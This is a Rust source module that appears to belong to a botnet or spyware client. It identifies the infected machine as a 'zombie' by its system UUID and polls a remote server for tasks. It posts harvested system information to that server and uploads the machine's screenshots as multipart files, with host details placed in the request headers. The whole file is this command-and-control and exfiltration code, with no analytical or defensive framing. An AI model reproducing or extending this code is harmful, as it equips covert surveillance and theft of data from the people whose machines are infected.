use reqwest::{self, multipart};
use std::collections::HashMap;

mod json_response;
mod utils;

pub async fn request_info_polling(
    url: String,
    client: &reqwest::Client,
    typepolling: &str,
) -> Result<json_response::JSONResponsePolling, reqwest::Error> {
    let mut map: HashMap<String, String> = HashMap::new();
    map.insert("typePolling".to_string(), typepolling.to_string());
    map.insert("zombie".to_string(), utils::get_system_uuid().unwrap());
    let resp_json = client
        .post(url)
        .json(&map)
        .send()
        .await?
        .json::<json_response::JSONResponsePolling>()
        .await?;
    Ok(resp_json)
}

pub async fn request_info_pc(
    url_host: &str,
    key_info_pc: &str,
    key_collection_pc: &str,
    client: &reqwest::Client,
    collection: bool,
) -> Result<(), reqwest::Error> {
    let map: HashMap<String, String> = utils::get_info_pc().unwrap();
    let url = format!("{}{}", url_host, {
        if collection {
            key_collection_pc
        } else {
            key_info_pc
        }
    });
    let _ = client.post(url).json(&map).send().await?.text().await?;
    Ok(())
}

pub async fn request_media_screenshot(
    url: String,
    client: &reqwest::Client
) -> Result<(), Box<dyn std::error::Error>> {
    let mut header_map = reqwest::header::HeaderMap::new();
    
    for (key, value) in utils::get_info_pc()? {
        let header_name = reqwest::header::HeaderName::from_bytes(key.as_bytes())?;
        let header_value = reqwest::header::HeaderValue::from_str(&value)?;
        header_map.insert(header_name, header_value);
    }


    for screenshot_path in utils::media_screenshot()? {
        let file_name = std::path::Path::new(&screenshot_path)
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("screenshot.png");

        let file_content = tokio::fs::read(&screenshot_path).await?;
        
        let part = multipart::Part::bytes(file_content)
            .file_name(file_name.to_string())
            .mime_str("image/png")?;

        let form = multipart::Form::new().part("file", part);
        
        let response = client
            .post(&url)
            .headers(header_map.clone()) 
            .multipart(form)
            .send()
            .await?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await?;
            return Err(format!("HTTP {}: {}", status, error_text).into());
        }
    }

    Ok(())
}
